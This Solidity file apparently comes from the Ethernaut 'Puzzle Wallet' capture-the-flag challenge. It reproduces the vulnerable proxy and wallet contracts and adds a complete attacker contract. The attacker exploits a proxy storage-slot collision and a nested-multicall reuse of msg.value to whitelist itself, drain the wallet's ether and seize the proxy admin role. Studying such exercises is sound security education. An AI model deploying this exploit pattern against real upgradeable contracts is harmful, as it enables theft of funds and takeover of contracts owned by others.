// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) payable UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract PuzzleProxyAttacker {
    PuzzleProxy public victim;

    constructor(PuzzleProxy victim_) payable {
        victim = victim_;

        victim.proposeNewAdmin(address(this));

        (bool addToWhitelistSuccess, ) = address(victim).call(
            abi.encodeWithSignature("addToWhitelist(address)", address(this))
        );

        require(
            addToWhitelistSuccess,
            "Error while calling addToWhitelist(address)"
        );

        bytes[] memory deepParameter = new bytes[](1);
        deepParameter[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory parameters = new bytes[](2);
        parameters[0] = abi.encodeWithSignature("deposit()");
        parameters[1] = abi.encodeWithSignature(
            "multicall(bytes[])",
            deepParameter
        );

        (bool multiSuccess, ) = address(victim).call{value: 0.001 ether}(
            abi.encodeWithSelector(PuzzleWallet.multicall.selector, parameters)
        );
        require(multiSuccess, "Error while calling multicall(bytes[])");

        (bool executeSuccess, ) = address(victim).call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                address(this),
                0.002 ether,
                ""
            )
        );
        require(
            executeSuccess,
            "Error while calling execute(address,uint256,bytes)"
        );

        (bool setMaxBalanceSuccess, ) = address(victim).call(
            abi.encodeWithSignature("setMaxBalance(uint256)", address(this))
        );
        require(
            setMaxBalanceSuccess,
            "Error while calling setMaxBalance(uint256)"
        );
    }
}
